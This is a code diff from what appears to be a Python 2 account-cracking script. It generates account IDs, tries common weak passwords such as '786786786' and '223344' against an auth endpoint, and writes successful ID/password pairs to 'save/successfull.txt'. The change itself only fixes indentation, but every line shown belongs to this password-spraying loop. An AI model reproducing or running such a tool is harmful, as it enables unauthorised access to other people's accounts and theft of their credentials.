@@ -260,7 +260,7 @@ def action():
 				else:	
 					pass2 = '786786786'
 					data = requests.get('http://localhost:5000/auth?id=' + k + c + uid + '&pass=' + pass2, headers = header).text
-			                     q = json.load(data)
+			                q = json.load(data)
 					if 'loc' in q:
 		                        	print '\x1b[1;92m|Jam|\x1b[1;92mOk|  ' + k + c + uid + '  \x1b[1;92mPASS|  ' + pass2                           											
 						okb = open('save/successfull.txt', 'a')
@@ -277,7 +277,7 @@ def action():
 						else:	
 							pass3 = '223344'
 							data = requests.get('http://localhost:5000/auth?id=' + k + c + uid + '&pass=' + pass3, headers = header).text
-			                                    q = json.load(data)
+			                                q = json.load(data)
 							if 'loc' in q:
 								print '\x1b[1;92m|Jam|\x1b[1;92mOk|  ' + k + c + uid + '  \x1b[1;92mPASS|  ' + pass3
 								okb = open('save/successfull.txt', 'a')
